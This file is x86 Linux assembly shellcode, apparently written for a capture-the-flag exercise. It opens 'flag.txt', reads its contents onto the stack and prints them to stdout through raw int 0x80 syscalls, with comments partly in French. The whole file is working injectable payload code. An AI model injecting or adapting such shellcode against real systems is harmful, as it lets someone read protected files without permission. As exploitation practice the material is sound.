bits 32

global main

section .text

    main:
        xor eax,eax
        xor ebx,ebx 
        xor ecx,ecx
        xor edx,edx

   
        ; open 
        mov al, 0x5 ;  syscall number of open
        push edx    ;  null  terminator

        ; push flag.txt on the top of the stack
        push 0x7478742e   ;   txt.
        push 0x67616c66   ;   galf

        
        
        mov ebx , esp
        int 0x80          
        ; return a file descriptor


        ;read 
        mov  esi, ebx 
        xor ebx,ebx 
        mov ebx,eax   ;  ebx points on the file descriptor
        mov ecx, esi  ; lu a partir du buff pointe par ecx

        xor eax,eax
        mov al,0x3  ; syscall number for read
        mov dl,0xff ; nb byte lu
        int 0x80

        ;write 
        mov edx, eax  
        xor eax,eax 
        mov al, 0x4    ; syscall number
        mov bl,0x1     ; ou on écrit 
        int 0x80

     
; this shellcode will also segfault because we are not quitting our function with exit 
 